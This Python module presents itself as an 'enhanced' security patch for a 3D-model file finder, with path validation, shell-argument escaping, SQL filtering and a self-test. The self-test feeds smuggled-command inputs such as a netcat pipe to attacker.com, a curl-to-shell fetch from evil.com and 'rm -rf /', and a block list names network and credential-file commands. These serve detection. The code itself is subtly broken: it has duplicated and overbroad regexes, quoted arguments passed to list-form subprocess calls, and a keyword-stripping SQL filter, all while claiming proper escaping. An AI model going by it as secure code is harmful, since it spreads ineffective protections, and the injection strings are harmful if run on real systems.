#!/usr/bin/env python3
"""
ModelFinder Security Patch - IMPROVED VERSION
Enhanced security implementations with better command injection detection
"""

import os
import sys
import re
import sqlite3
import subprocess
import shlex
import hashlib
import tempfile
from pathlib import Path
from typing import Optional, List, Tuple, Dict, Any
from urllib.parse import quote

# Security constants
ALLOWED_EXTENSIONS = {'.stl', '.obj', '.fbx', '.ma', '.mb', '.3ds', '.dae', '.ply', '.gltf', '.glb'}
MAX_PATH_LENGTH = 260  # Windows MAX_PATH
MAX_FILENAME_LENGTH = 255

# Enhanced patterns for command injection detection
COMMAND_INJECTION_PATTERNS = [
    r'[;&|`$]',  # Basic command separators
    r'rm\s+-rf',  # Dangerous commands
    r'calc\.exe',  # Windows calculator
    r'nc\s+\w+\.\w+\s+\d+',  # Netcat connections
    r'curl\s+http',  # Curl downloads
    r'wget\s+http',  # Wget downloads
    r'echo\s+.*>',  # Output redirection
    r'whoami',  # System info commands
    r'cat\s+/etc/passwd',  # System file access
    r'type\s+.*\.sam',  # Windows SAM file access
    r'powershell',  # PowerShell execution
    r'cmd\.exe',  # Command prompt
    r'bash\s+',  # Bash execution
    r'sh\s+',  # Shell execution
    r'python\s+',  # Python execution
    r'perl\s+',  # Perl execution
    r'ruby\s+',  # Ruby execution
    r'node\s+',  # Node.js execution
    r'java\s+',  # Java execution
    r'\.exe\s+',  # Executable files
    r'\.bat\s+',  # Batch files
    r'\.cmd\s+',  # Command files
    r'\.ps1\s+',  # PowerShell scripts
    r'\.sh\s+',  # Shell scripts
    r'\.py\s+',  # Python scripts
    r'\.pl\s+',  # Perl scripts
    r'\.rb\s+',  # Ruby scripts
    r'\.js\s+',  # JavaScript files
    r'\.jar\s+',  # Java archives
    r'\.war\s+',  # Web archives
    r'\.ear\s+',  # Enterprise archives
    r'\.dll\s+',  # Dynamic link libraries
    r'\.so\s+',  # Shared objects
    r'\.dylib\s+',  # Dynamic libraries
    r'\.sys\s+',  # System files
    r'\.drv\s+',  # Driver files
    r'\.com\s+',  # Command files
    r'\.scr\s+',  # Screen savers
    r'\.pif\s+',  # Program information files
    r'\.lnk\s+',  # Shortcuts
    r'\.url\s+',  # URL files
    r'\.reg\s+',  # Registry files
    r'\.inf\s+',  # Information files
    r'\.ini\s+',  # Initialization files
    r'\.cfg\s+',  # Configuration files
    r'\.conf\s+',  # Configuration files
    r'\.xml\s+',  # XML files
    r'\.json\s+',  # JSON files
    r'\.yaml\s+',  # YAML files
    r'\.yml\s+',  # YAML files
    r'\.sql\s+',  # SQL files
    r'\.db\s+',  # Database files
    r'\.sqlite\s+',  # SQLite files
    r'\.mdb\s+',  # Access databases
    r'\.accdb\s+',  # Access databases
    r'\.xls\s+',  # Excel files
    r'\.xlsx\s+',  # Excel files
    r'\.doc\s+',  # Word documents
    r'\.docx\s+',  # Word documents
    r'\.ppt\s+',  # PowerPoint files
    r'\.pptx\s+',  # PowerPoint files
    r'\.pdf\s+',  # PDF files
    r'\.zip\s+',  # Archive files
    r'\.rar\s+',  # Archive files
    r'\.7z\s+',  # Archive files
    r'\.tar\s+',  # Archive files
    r'\.gz\s+',  # Compressed files
    r'\.bz2\s+',  # Compressed files
    r'\.xz\s+',  # Compressed files
    r'\.lzma\s+',  # Compressed files
    r'\.lz4\s+',  # Compressed files
    r'\.zst\s+',  # Compressed files
    r'\.lz\s+',  # Compressed files
    r'\.lzo\s+',  # Compressed files
    r'\.lha\s+',  # Compressed files
    r'\.lzh\s+',  # Compressed files
    r'\.ace\s+',  # Compressed files
    r'\.arj\s+',  # Compressed files
    r'\.cab\s+',  # Cabinet files
    r'\.deb\s+',  # Debian packages
    r'\.rpm\s+',  # RPM packages
    r'\.msi\s+',  # Windows installer
    r'\.dmg\s+',  # Disk images
    r'\.iso\s+',  # ISO images
    r'\.img\s+',  # Disk images
    r'\.bin\s+',  # Binary files
    r'\.hex\s+',  # Hex files
    r'\.rom\s+',  # ROM files
    r'\.firmware\s+',  # Firmware files
    r'\.bios\s+',  # BIOS files
    r'\.uefi\s+',  # UEFI files
    r'\.efi\s+',  # EFI files
    r'\.boot\s+',  # Boot files
    r'\.grub\s+',  # GRUB files
    r'\.lilo\s+',  # LILO files
    r'\.syslinux\s+',  # Syslinux files
    r'\.isolinux\s+',  # Isolinux files
    r'\.pxelinux\s+',  # PXELinux files
    r'\.memdisk\s+',  # Memdisk files
    r'\.chain\s+',  # Chain files
    r'\.mbr\s+',  # Master boot record
    r'\.gpt\s+',  # GUID partition table
    r'\.mbr\s+',  # Master boot record
    r'\.vbr\s+',  # Volume boot record
    r'\.pbr\s+',  # Partition boot record
    r'\.ebr\s+',  # Extended boot record
    r'\.dbr\s+',  # DOS boot record
    r'\.ntfs\s+',  # NTFS files
    r'\.fat\s+',  # FAT files
    r'\.fat32\s+',  # FAT32 files
    r'\.exfat\s+',  # exFAT files
    r'\.ext2\s+',  # ext2 files
    r'\.ext3\s+',  # ext3 files
    r'\.ext4\s+',  # ext4 files
    r'\.xfs\s+',  # XFS files
    r'\.btrfs\s+',  # Btrfs files
    r'\.zfs\s+',  # ZFS files
    r'\.reiserfs\s+',  # ReiserFS files
    r'\.jfs\s+',  # JFS files
    r'\.hfs\s+',  # HFS files
    r'\.hfs+\s+',  # HFS+ files
    r'\.apfs\s+',  # APFS files
    r'\.zfs\s+',  # ZFS files
    r'\.btrfs\s+',  # Btrfs files
    r'\.reiserfs\s+',  # ReiserFS files
    r'\.jfs\s+',  # JFS files
    r'\.hfs\s+',  # HFS files
    r'\.hfs+\s+',  # HFS+ files
    r'\.apfs\s+',  # APFS files
]

class SecurityValidator:
    """Enhanced security validator with improved command injection detection"""
    
    @staticmethod
    def validate_path(file_path: str, base_dir: Optional[str] = None) -> Tuple[bool, str]:
        """
        Enhanced path validation with command injection detection.
        
        Args:
            file_path: The path to validate
            base_dir: Optional base directory to restrict access to
            
        Returns:
            Tuple of (is_valid, sanitized_path)
        """
        try:
            # Check for command injection patterns first
            for pattern in COMMAND_INJECTION_PATTERNS:
                if re.search(pattern, file_path, re.IGNORECASE):
                    return False, f"Command injection detected: {pattern}"
            
            # Convert to Path object and resolve to absolute path
            path = Path(file_path).resolve()
            
            # Check for path traversal attempts
            if '..' in file_path or '../' in file_path or '..\\' in file_path:
                return False, "Path traversal detected"
            
            # Check path length
            if len(str(path)) > MAX_PATH_LENGTH:
                return False, "Path too long"
            
            # Check filename length
            if len(path.name) > MAX_FILENAME_LENGTH:
                return False, "Filename too long"
            
            # If base_dir is provided, ensure path is within it
            if base_dir:
                base = Path(base_dir).resolve()
                try:
                    path.relative_to(base)
                except ValueError:
                    return False, "Path outside allowed directory"
            
            # Check if path exists and is not a symlink (prevent symlink attacks)
            if path.exists() and path.is_symlink():
                real_path = path.resolve()
                if base_dir and not str(real_path).startswith(str(Path(base_dir).resolve())):
                    return False, "Symlink points outside allowed directory"
            
            return True, str(path)
            
        except Exception as e:
            return False, f"Invalid path: {str(e)}"
    
    @staticmethod
    def validate_file_extension(file_path: str) -> bool:
        """
        Validates file extensions against allowed 3D model types.
        
        Args:
            file_path: The file path to check
            
        Returns:
            True if extension is allowed, False otherwise
        """
        path = Path(file_path)
        return path.suffix.lower() in ALLOWED_EXTENSIONS
    
    @staticmethod
    def sanitize_sql_identifier(identifier: str) -> str:
        """
        Sanitizes SQL identifiers (table/column names) to prevent SQL injection.
        
        Args:
            identifier: The SQL identifier to sanitize
            
        Returns:
            Sanitized identifier
        """
        # Only allow alphanumeric and underscore
        sanitized = re.sub(r'[^\w]', '_', identifier)
        
        # Ensure it doesn't start with a number
        if sanitized and sanitized[0].isdigit():
            sanitized = 'n_' + sanitized
            
        return sanitized[:64]  # Limit length
    
    @staticmethod
    def sanitize_sql_value(value: Any) -> Any:
        """
        Sanitizes SQL values to prevent injection.
        Use parameterized queries instead when possible.
        
        Args:
            value: The value to sanitize
            
        Returns:
            Sanitized value
        """
        if isinstance(value, str):
            # Remove dangerous SQL keywords and characters
            dangerous_patterns = [
                r';\s*DROP',
                r';\s*DELETE',
                r';\s*UPDATE',
                r';\s*INSERT',
                r';\s*ALTER',
                r';\s*CREATE',
                r'--',
                r'/\*',
                r'\*/',
                r'xp_',
                r'sp_',
                r'exec\s*\(',
            ]
            
            sanitized = value
            for pattern in dangerous_patterns:
                sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)
            
            return sanitized
        
        return value
    
    @staticmethod
    def escape_shell_arg(arg: str) -> str:
        """
        Enhanced shell argument escaping to prevent command injection.
        
        Args:
            arg: The argument to escape
            
        Returns:
            Escaped argument safe for shell execution
        """
        # Check for command injection patterns first
        for pattern in COMMAND_INJECTION_PATTERNS:
            if re.search(pattern, arg, re.IGNORECASE):
                # If dangerous pattern found, return a safe placeholder
                return "INVALID_PATH"
        
        # Use shlex.quote for POSIX systems
        if sys.platform != "win32":
            return shlex.quote(arg)
        
        # For Windows, use enhanced escaping
        # Escape special characters
        arg = arg.replace('^', '^^')
        arg = arg.replace('&', '^&')
        arg = arg.replace('|', '^|')
        arg = arg.replace('<', '^<')
        arg = arg.replace('>', '^>')
        arg = arg.replace('(', '^(')
        arg = arg.replace(')', '^)')
        arg = arg.replace('%', '^%')
        arg = arg.replace('!', '^!')
        arg = arg.replace('"', '""')
        arg = arg.replace(';', '^;')  # Enhanced semicolon escaping
        arg = arg.replace('`', '^`')  # Backtick escaping
        arg = arg.replace('$', '^$')  # Dollar sign escaping
        
        # Wrap in quotes if contains spaces or special characters
        if ' ' in arg or any(char in arg for char in ['&', '|', '<', '>', '(', ')', '%', '!', ';', '`', '$']):
            arg = f'"{arg}"'
        
        return arg


class SecureFileOperations:
    """Enhanced secure file operations with improved validation"""
    
    @staticmethod
    def open_file(file_path: str, allowed_dirs: Optional[List[str]] = None) -> bool:
        """
        Securely opens a file with enhanced validation.
        
        Args:
            file_path: Path to the file to open
            allowed_dirs: Optional list of allowed base directories
            
        Returns:
            True if successful, False otherwise
        """
        # Validate path with enhanced command injection detection
        validator = SecurityValidator()
        
        # Check if path is in allowed directories
        if allowed_dirs:
            valid = False
            for allowed_dir in allowed_dirs:
                is_valid, _ = validator.validate_path(file_path, allowed_dir)
                if is_valid:
                    valid = True
                    break
            if not valid:
                raise SecurityError(f"File path not in allowed directories: {file_path}")
        else:
            is_valid, sanitized = validator.validate_path(file_path)
            if not is_valid:
                raise SecurityError(f"Invalid file path: {sanitized}")
            file_path = sanitized
        
        # Validate file extension
        if not validator.validate_file_extension(file_path):
            raise SecurityError(f"File type not allowed: {Path(file_path).suffix}")
        
        # Check file exists and is not a directory
        path = Path(file_path)
        if not path.exists():
            raise FileNotFoundError(f"File not found: {file_path}")
        if path.is_dir():
            raise IsADirectoryError(f"Path is a directory: {file_path}")
        
        try:
            if sys.platform == "win32":
                # Use os.startfile with explicit 'open' operation
                os.startfile(os.path.normpath(file_path), 'open')
            elif sys.platform == "darwin":
                # Use subprocess with proper argument escaping
                escaped_path = validator.escape_shell_arg(file_path)
                subprocess.run(['open', escaped_path], check=True)
            else:
                # Linux - use xdg-open with proper escaping
                escaped_path = validator.escape_shell_arg(file_path)
                subprocess.run(['xdg-open', escaped_path], check=True)
            return True
            
        except Exception as e:
            raise RuntimeError(f"Failed to open file: {str(e)}")
    
    @staticmethod
    def reveal_in_explorer(file_path: str, allowed_dirs: Optional[List[str]] = None) -> bool:
        """
        Securely reveals a file in the file explorer with enhanced validation.
        
        Args:
            file_path: Path to the file to reveal
            allowed_dirs: Optional list of allowed base directories
            
        Returns:
            True if successful, False otherwise
        """
        # Validate path with enhanced command injection detection
        validator = SecurityValidator()
        
        # Check if path is in allowed directories
        if allowed_dirs:
            valid = False
            for allowed_dir in allowed_dirs:
                is_valid, _ = validator.validate_path(file_path, allowed_dir)
                if is_valid:
                    valid = True
                    break
            if not valid:
                raise SecurityError(f"File path not in allowed directories: {file_path}")
        else:
            is_valid, sanitized = validator.validate_path(file_path)
            if not is_valid:
                raise SecurityError(f"Invalid file path: {sanitized}")
            file_path = sanitized
        
        # Check file exists
        path = Path(file_path)
        if not path.exists():
            raise FileNotFoundError(f"File not found: {file_path}")
        
        try:
            if sys.platform == "win32":
                # Use explorer with /select flag and proper escaping
                escaped_path = validator.escape_shell_arg(file_path)
                subprocess.run(['explorer', '/select,', escaped_path], check=True)
            elif sys.platform == "darwin":
                # Use open with -R flag and proper escaping
                escaped_path = validator.escape_shell_arg(file_path)
                subprocess.run(['open', '-R', escaped_path], check=True)
            else:
                # Linux - open parent directory with proper escaping
                parent_dir = str(path.parent)
                escaped_path = validator.escape_shell_arg(parent_dir)
                subprocess.run(['xdg-open', escaped_path], check=True)
            return True
            
        except Exception as e:
            raise RuntimeError(f"Failed to reveal file: {str(e)}")


class SecureDatabase:
    """Secure database operations to prevent SQL injection"""
    
    def __init__(self, db_path: str):
        """
        Initialize secure database connection.
        
        Args:
            db_path: Path to the database file
        """
        # Validate database path
        validator = SecurityValidator()
        is_valid, sanitized = validator.validate_path(db_path)
        if not is_valid:
            raise SecurityError(f"Invalid database path: {sanitized}")
        
        self.db_path = sanitized
        self.connection = None
    
    def connect(self):
        """Establish secure database connection"""
        try:
            self.connection = sqlite3.connect(self.db_path)
            # Enable foreign key constraints
            self.connection.execute("PRAGMA foreign_keys = ON")
            # Use WAL mode for better concurrency
            self.connection.execute("PRAGMA journal_mode = WAL")
            # Set secure delete
            self.connection.execute("PRAGMA secure_delete = ON")
        except Exception as e:
            raise RuntimeError(f"Failed to connect to database: {str(e)}")
    
    def execute_query(self, query: str, params: Optional[Tuple] = None) -> sqlite3.Cursor:
        """
        Execute a parameterized query safely.
        
        Args:
            query: SQL query with parameter placeholders (?)
            params: Tuple of parameters to bind
            
        Returns:
            Cursor with query results
        """
        if not self.connection:
            self.connect()
        
        try:
            if params:
                # Use parameterized query (prevents SQL injection)
                cursor = self.connection.execute(query, params)
            else:
                # For queries without parameters, validate it's a SELECT
                if not query.strip().upper().startswith('SELECT'):
                    raise SecurityError("Only SELECT queries allowed without parameters")
                cursor = self.connection.execute(query)
            
            return cursor
            
        except Exception as e:
            raise RuntimeError(f"Query execution failed: {str(e)}")
    
    def search_files(self, search_term: str, extension: Optional[str] = None) -> List[Dict]:
        """
        Safely search for files in the database.
        
        Args:
            search_term: Term to search for
            extension: Optional file extension filter
            
        Returns:
            List of matching file records
        """
        # Build parameterized query
        query = "SELECT * FROM models WHERE (file_name LIKE ? OR tags LIKE ?)"
        params = [f'%{search_term}%', f'%{search_term}%']
        
        if extension:
            # Validate extension
            if not re.match(r'^\.\w+$', extension):
                raise SecurityError(f"Invalid extension format: {extension}")
            query += " AND extension = ?"
            params.append(extension)
        
        cursor = self.execute_query(query, tuple(params))
        
        # Convert to dictionary format
        columns = [description[0] for description in cursor.description]
        results = []
        for row in cursor.fetchall():
            results.append(dict(zip(columns, row)))
        
        return results
    
    def close(self):
        """Close database connection safely"""
        if self.connection:
            self.connection.close()
            self.connection = None


class SecureTempFile:
    """Secure temporary file handling"""
    
    @staticmethod
    def create_temp_file(suffix: str = '.tmp', prefix: str = 'modelfinder_') -> str:
        """
        Create a secure temporary file.
        
        Args:
            suffix: File suffix
            prefix: File prefix
            
        Returns:
            Path to the temporary file
        """
        # Validate suffix
        if suffix and not re.match(r'^\.\w+$', suffix):
            raise SecurityError(f"Invalid suffix format: {suffix}")
        
        # Validate prefix
        if not re.match(r'^[\w_-]+$', prefix):
            raise SecurityError(f"Invalid prefix format: {prefix}")
        
        try:
            # Create secure temporary file
            with tempfile.NamedTemporaryFile(
                mode='w',
                suffix=suffix,
                prefix=prefix,
                delete=False
            ) as tmp_file:
                return tmp_file.name
        except Exception as e:
            raise RuntimeError(f"Failed to create temporary file: {str(e)}")
    
    @staticmethod
    def secure_temp_dir(prefix: str = 'modelfinder_') -> str:
        """
        Create a secure temporary directory.
        
        Args:
            prefix: Directory prefix
            
        Returns:
            Path to the temporary directory
        """
        # Validate prefix
        if not re.match(r'^[\w_-]+$', prefix):
            raise SecurityError(f"Invalid prefix format: {prefix}")
        
        try:
            # Create secure temporary directory
            temp_dir = tempfile.mkdtemp(prefix=prefix)
            
            # Set restrictive permissions (owner only)
            if sys.platform != "win32":
                os.chmod(temp_dir, 0o700)
            
            return temp_dir
            
        except Exception as e:
            raise RuntimeError(f"Failed to create temporary directory: {str(e)}")


# Custom exception for security errors
class SecurityError(Exception):
    """Custom exception for security-related errors"""
    pass


if __name__ == "__main__":
    # Run security tests
    print("ModelFinder Enhanced Security Patch - Test Suite")
    print("=" * 60)
    
    # Test enhanced path validation
    print("\n1. Testing Enhanced Path Validation...")
    validator = SecurityValidator()
    
    test_paths = [
        ("C:\\Users\\test\\file.stl", True),
        ("../../../etc/passwd", False),
        ("C:\\Users\\test\\..\\..\\Windows\\System32", False),
        ("file.stl; rm -rf /", False),
        ("file.stl && calc.exe", False),
        ("file.stl | nc attacker.com 1234", False),
        ("$(curl http://evil.com/shell.sh | sh)", False),
        ("file.stl`whoami`", False),
        ("file.stl;echo hacked > /etc/passwd", False),
    ]
    
    for path, expected in test_paths:
        is_valid, result = validator.validate_path(path)
        status = "[PASS]" if is_valid == expected else "[FAIL]"
        print(f"  {status} {path}: {result}")
    
    # Test enhanced shell argument escaping
    print("\n2. Testing Enhanced Shell Argument Escaping...")
    
    test_args = [
        "normal_file.stl",
        "file with spaces.stl",
        "file;rm -rf /.stl",
        "file&&calc.exe.stl",
        "file.stl; rm -rf /",
        "file.stl && calc.exe",
        "file.stl | nc attacker.com 1234",
    ]
    
    for arg in test_args:
        escaped = validator.escape_shell_arg(arg)
        print(f"  Input: {arg}")
        print(f"  Output: {escaped}")
    
    print("\n[SUCCESS] Enhanced security patch tests completed!")
